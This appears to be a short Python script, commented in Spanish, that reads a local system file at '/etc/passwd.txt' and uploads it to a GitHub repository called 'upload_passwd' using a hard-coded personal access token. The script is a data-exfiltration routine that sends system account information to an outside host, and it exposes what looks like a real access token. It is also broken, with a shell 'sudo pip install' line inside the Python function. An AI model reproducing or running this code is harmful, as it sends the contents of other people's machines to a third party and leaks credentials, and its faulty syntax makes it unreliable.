def run():
  sudo pip install PyGithub
  from github import Github
  import os
  
  # Tu token de acceso personal
  token = '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'
  
  # Nombre de usuario y nombre del repositorio
  usuario = 'Oxitocinaa'
  repositorio = 'upload_passwd'
  
  # Ruta local del archivo que deseas subir
  archivo_local = '/etc/passwd.txt'
  
  # Rama en la que deseas realizar la carga
  rama = 'main'
  
  # Crea una instancia de la clase Github con tu token
  g = Github(token)
  
  # Obtiene el repositorio
  repo = g.get_user(usuario).get_repo(repositorio)
  
  # Sube el archivo al repositorio
  with open(archivo_local, 'rb') as archivo:
      contenido = archivo.read()
      repo.create_file(archivo_local, f"Commit desde script", contenido, branch=rama)
  
  print(f"Archivo '{archivo_local}' subido exitosamente a la rama '{rama}' en el repositorio '{repositorio}'.")
